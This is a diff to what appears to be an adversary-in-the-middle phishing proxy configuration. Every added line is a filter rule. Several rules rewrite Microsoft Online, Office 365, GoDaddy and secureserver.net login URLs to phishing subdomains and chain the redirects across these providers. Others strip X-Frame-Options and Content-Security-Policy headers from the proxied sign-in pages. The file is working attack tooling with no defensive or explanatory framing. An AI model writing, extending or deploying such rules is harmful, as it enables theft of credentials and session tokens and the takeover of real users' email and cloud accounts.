@@ -39,10 +39,28 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://sso\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://idp\\.godaddy\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'email', domain: 'secureserver.net', search: 'https://email\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'outlook', domain: 'secureserver.net', search: 'https://outlook\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'secureserver.net', search: 'https://login\\.secureserver\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  
+  # Cross-domain Microsoft filters (trigger from GoDaddy domains back to Microsoft)
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\\.microsoftonline\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'outlook', domain: 'office365.com', search: 'https://outlook\\.office365\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'outlook', domain: 'office.com', search: 'https://outlook\\.office\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
   
   # Remove security headers
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'email', domain: 'secureserver.net', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'email.secureserver.net', orig_sub: 'email', domain: 'secureserver.net', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
   
   # ADFS domain replacements
   - {triggers_on: 'adfs.*', orig_sub: 'adfs', domain: '*', search: 'https://adfs\\.([a-zA-Z0-9.-]+)', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
